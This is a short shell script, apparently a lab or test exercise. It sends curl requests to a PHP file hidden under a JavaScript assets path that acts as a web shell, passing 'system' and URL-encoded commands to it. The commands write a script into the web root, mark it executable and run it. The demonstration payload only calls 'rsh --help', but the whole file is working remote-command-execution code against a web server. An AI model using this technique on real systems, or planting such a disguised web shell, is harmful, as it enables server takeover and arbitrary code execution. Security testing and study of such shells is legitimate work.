#!/bin/sh

# create script file
# echo "#!/bin/sh" > /var/www/html/remote-code.sh; echo "rsh --help &> /var/www/html/ssh-help.txt" >> /var/www/html/remote-code.sh
curl 'http://localhost/assets/js/main.php?0=system&1=echo%20%22%23!/bin/sh%22%20%3E%20/var/www/html/remote-code.sh%3B%20echo%20%22rsh%20--help%20%26%3E%20/var/www/html/ssh-help.txt%22%20%3E%3E%20/var/www/html/remote-code.sh'

# execute script
# chmod +x /var/www/html/remote-code.sh; bash /var/www/html/remote-code.sh
curl 'http://localhost/assets/js/main.php?0=system&1=chmod%20%2Bx%20%2Fvar%2Fwww%2Fhtml%2Fremote-code.sh%3B%20bash%20%2Fvar%2Fwww%2Fhtml%2Fremote-code.sh'